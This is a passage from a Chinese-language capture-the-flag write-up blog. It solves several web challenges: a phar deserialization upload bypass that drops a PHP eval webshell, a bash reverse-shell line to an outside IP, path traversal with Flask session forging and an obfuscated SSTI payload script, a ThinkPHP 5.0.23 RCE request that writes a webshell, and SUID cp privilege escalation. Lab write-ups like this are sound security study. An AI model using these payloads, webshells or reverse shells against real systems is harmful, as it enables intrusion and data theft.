class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd=<span class="string">&quot;echo &#x27;&lt;?=@eval(\$_POST[&#x27;a&#x27;]);&#x27;&gt;/var/www/html/1.php&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sh7err</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;111.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$sh7err</span>);<span class="comment">//将自定义的meta-data存入manifest，setMetadata()会将对象进行序列化</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//签名自动计算</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>这里有必要简单解释一下为什么phar文件能够触发反序列化，用户自定义的meta-data会被序列化处理后保存道manifest中，当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data的内容</p></blockquote><p>这里直接上传111.phar并不行<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pharone1.PNG"><br>phar的stub内容的特征就是以<code>_HALT_COMPILER();?&gt;</code>结尾，这里可以下gzip压缩一下来绕过检测。<br>脚本如下：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib import sha1</span><br><span class="line">import gzip</span><br><span class="line"></span><br><span class="line">with <span class="title function_ invoke__">open</span>(<span class="string">&#x27;111.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment">#打开你想要修改的文件</span></span><br><span class="line">    f = file.<span class="title function_ invoke__">read</span>()</span><br><span class="line">s = f[:-<span class="number">28</span>]  <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:]  <span class="comment"># 获取签名类型以及GBMB标识</span></span><br><span class="line">new_file = s + <span class="title function_ invoke__">sha1</span>(s).<span class="title function_ invoke__">digest</span>() + h  <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line">f_gzip = gzip.<span class="title function_ invoke__">GzipFile</span>(<span class="string">&quot;000.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>)  <span class="comment">#返回文件的名称和权限</span></span><br><span class="line">f_gzip.<span class="title function_ invoke__">write</span>(new_file)</span><br><span class="line">f_gzip.<span class="title function_ invoke__">close</span>()</span><br></pre></td></tr></table></figure></div><p>成功上传处理后的文件<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pharone2.PNG"><br>直接getshell就完事了<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pharone3.PNG"></p><p>顺便看一下index.php源码到底是啥：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/x-png&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>)</span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Upload Error!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/__HALT_COMPILER/i&quot;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>])))&#123;</span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.&quot;</span>.<span class="variable">$extension</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Saved to: &quot;</span> . <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;!preg_match(&quot;/__HALT_COMPILER/i&quot;,FILE_CONTENTS)&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hacker?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>可以好好理解</p><p>当时做的时候思路是对的，但是想用<code>ls |tee 1.txt</code>来把命令回显写到1.txt里面去，但是没有反应，查了一下应该是权限问题。因为我们不是root用户。<br>除了上传shell，也可以反弹shell：<br><code>$this-&gt;cmd=&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/115.236.153.177/44202 0&gt;&amp;1&#39;&quot;;</code></p><h2 id="injectme"><a href="#injectme" class="headerlink" title="injectme"></a>injectme</h2><p>图片是可以点击的，点击后可以转到&#x2F;cancanneed路由下面，查看110.jpg，泄露了部分&#x2F;download路由下的源码<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/injectme1.jpg"><br>可以看到&#x2F;download路由下对get传上来的file参数进行了处理，会把其中的<code>../</code>删掉，那么我们根据文件目录的结构可以构造<code>..././..././..././app/app.py</code>来下载到app.py，在dockerfile中暴露了存在&#x2F;app目录。<br>app.py:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():</span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename:</span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)</span><br><span class="line">        <span class="built_in">print</span>(filename)</span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):</span><br><span class="line">            <span class="keyword">return</span> send_file(filename)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>注意这里<code>from config import secret_key</code>,说明&#x2F;app下面有config文件保存了密钥，构造file为<code>..././..././..././app/config.py</code>来下载,成功获得密钥为<code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code>，这样就可以修改session数据了。<br>观察&#x2F;backdoor路由可以知道,session中的user字段可以作为ssti注入点，但是奈何它这里过滤了太多，只好利用官方的八进制绕过脚本了。</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_octal_ascii</span>(<span class="params">s</span>):</span><br><span class="line">    octal_ascii = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        char_code = <span class="built_in">ord</span>(char)</span><br><span class="line">        octal_ascii += <span class="string">&quot;\\\\&quot;</span> + <span class="built_in">format</span>(char_code, <span class="string">&#x27;03o&#x27;</span>) <span class="comment"># 03o，0表示前面不够补0，3表示输出为三位，表示转换成8进制</span></span><br><span class="line">        <span class="comment"># octal_ascii += &quot;\\\\&quot; + format(char_code, &#x27;o&#x27;)    </span></span><br><span class="line">    <span class="keyword">return</span> octal_ascii</span><br><span class="line">secret_key = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(7*7)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\u005f\\\\u005f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\x5f\\\\x5f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">eval_shell = <span class="string">&quot;\&quot;\&quot;&quot;</span>+string_to_octal_ascii(<span class="string">&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat /y0U3_f14g_1s_h3re\&quot;).read()&quot;</span>)+<span class="string">&quot;\&quot;\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(eval_shell)</span><br><span class="line"><span class="comment"># docker部署&amp;windows运行payload</span></span><br><span class="line"><span class="comment"># &#123;&#123;x.__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;)&#125;&#125;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;%print(x|attr(\&quot;\&quot;\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\145\\\\166\\\\141\\\\154\&quot;\&quot;)(&#123;0&#125;))%&#125;&#125;&quot;</span>.<span class="built_in">format</span>(eval_shell) <span class="comment">#格式化字符串中&#123;可以当作转义字符</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">command = <span class="string">&quot;python flask_session_cookie_manager3.py encode -s \&quot;&#123;0&#125;\&quot; -t \&quot;&#123;&#123;&#x27;user&#x27;:&#x27;&#123;1&#125;&#x27;&#125;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(secret_key,payload)</span><br><span class="line"><span class="built_in">print</span>(command)</span><br><span class="line"></span><br><span class="line">session_data = subprocess.check_output(command, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line"><span class="comment"># linux和windows换行不一样，linux是去掉最后一个，windows是最后两个。</span></span><br><span class="line">session_data = session_data[:-<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># session_data = session_data[:-1].decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1ebcbd34-440e-4b5b-b36a-8dfd0c388230.node4.buuoj.cn:81/backdoor&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: session_data&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line"><span class="comment">#print(res.text)</span></span><br><span class="line">pattern = <span class="string">r&#x27;&lt;h1&gt;(.*)&lt;/h1&gt;&#x27;</span></span><br><span class="line">result_content = re.search(pattern, res.text, re.S)</span><br><span class="line"><span class="comment">#print(result_content)</span></span><br><span class="line"><span class="keyword">if</span> result_content:</span><br><span class="line">    result = result_content.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;something wrong!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/injectme_flag.jpg"></p><h1 id="week-5"><a href="#week-5" class="headerlink" title="week 5"></a>week 5</h1><h2 id="final"><a href="#final" class="headerlink" title="final"></a>final</h2><blockquote><p>考点：ThinkPHP 5.0.23 RCE、SUID提权</p></blockquote><p>一个thinkphp框架搭的web服务，而且是v5.0.23，这种版本的thinkphp框架有一个漏洞<code>5.0.23 RCE</code>。<br>参考：<a href="">https://blog.csdn.net/Lucky1youzi/article/details/128740552</a><br>漏洞利用exp:</p><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=captcha </span><br><span class="line"></span><br><span class="line"><span class="attribute">POST</span><span class="punctuation">: </span>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</span><br></pre></td></tr></table></figure></div><p>直接利用这个漏洞来传一句话木马，在filter[]&#x3D;后面写php中的函数，在最后的等号后面写函数的参数。<br>先看一下有没有禁用什么函数：<code>_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</code><br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_disable.PNG"><br>禁用了system函数，那我们就用exec函数<br>payload如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo &#x27;&lt;?php eval($_POST[&quot;xzz&quot;]);?&gt;&#x27;  &gt; 4.php</span><br></pre></td></tr></table></figure></div><p>注意这里echo单引号和双引号是有区别的</p><blockquote><p>单引号 (<code>&#39;&#39;</code>)：<br>单引号内的内容会被视为纯文本，不进行任何转义或替换。<br>例如：<code>echo &#39;Hello $USER&#39;</code> 会输出 <code>Hello $USER</code>，而不会替换 <code>$USER</code> 为实际的用户名。<br>双引号 (<code>&quot;&quot;</code>)：<br>双引号内的内容允许替换变量和转义特殊字符。<br>例如：<code>echo &quot;Hello $USER&quot;</code> 会输出 <code>Hello</code> 后跟实际的用户名，因为 <code>$USER</code> 会被替换为相应的变量值。</p></blockquote><p>这里我们想让一句话木马原封不动的传到目标文件中，所以用单引号而不是双引号。如果用了双引号那么在echo的过程中就会解析$_POST[“xzz”],导致报错<code>Notice: Array to string conversion in /var/www/public/4.php on line 1</code>,它认为我们把数组当成了字符串，echo不能输出字符串，这是因为$_POST[“xzz”]如果xzz没有被赋值的话默认为空，导致输出了一个数组。这里还真的卡了我一会，太菜了:(<br>成功上传webshell后可以在浏览器页面getshell，也可以用蚁剑来连，我这里两种都用了，所以图片有些冲突了。<br>在蚁剑上看到之前echo双引号上传的一句话木马都变成了这样：<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_qs.PNG"><br><code>$_POST</code>都没了，有点意思。<br>在浏览器上看了一下根目录下的文件以及它们的权限：<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_rwx.PNG"><br>可以看到flag文件只有root用户有权限访问，那么我们作为www-data用户肯定是访问不了的，这里有一个suid提权的知识点。<br><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/MssGuo/article/details/120754324">Linux中文件特殊权限suid、sgid、sticky（有图详细讲解） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>简单来说就是linux下对二进制可执行文件（命令）可以赋予一种特殊的权限来让所有用户在执行命令时拥有文件拥有者（一般是root）的权限。<br>对此我们可以用<code>find / -user root -perm -4000 -print 2&gt;/dev/null</code>命令来查看所有拥有suid权限的文件，用gpt小小的解释一下:</p><ol><li><p><code>find</code>: 这是一个用于搜索文件系统的命令。</p></li><li><p><code>/</code>: 搜索的起始目录，这里是根目录，表示从整个文件系统开始搜索。</p></li><li><p><code>-user root</code>: 指定搜索的文件属主为root用户。</p></li><li><p><code>-perm -4000</code>: 指定搜索具有设置了SUID位的文件。SUID（Set User ID）是一种权限位，允许在执行文件时将其权限设置为文件所有者的权限，而不是执行者的权限。这通常用于特定的系统命令，以便以文件所有者的权限执行，而不是执行者的权限。</p></li><li><p><code>-print</code>: 将找到的文件的路径打印到标准输出。</p></li><li><p><code>2&gt;/dev/null</code>: 将标准错误输出（stderr）重定向到&#x2F;dev&#x2F;null，这样错误信息将被丢弃，而不会显示在终端上。<br>还可以用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>等命令。<br>但是这里我输入命令后并没有回显，根据官方的说法，确实比赛结束后环境存在一些问题。原来的结果应该是：<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_suid.png"><br>可以看到cp命令也有suid权限，那么我们就利用它把flag复制到别的文件里面查看，达到一个提权的效果。<br>把flag文件复制到start.sh文件中然后读取：<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/final_flag.PNG"></p></li></ol><h2 id="ye’spickle"><a href="#ye’spickle" class="headerlink" title="ye’spickle"></a>ye’spickle</h2><blockquote><p>考点：PICKLE反序列化，PYTHON_JWT，CVE-2022-39227</p></blockquote><p>经常做php反序列化，这还是头一次做python反序列化，值得记录一下。<br>题目给了源码，先看一眼：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 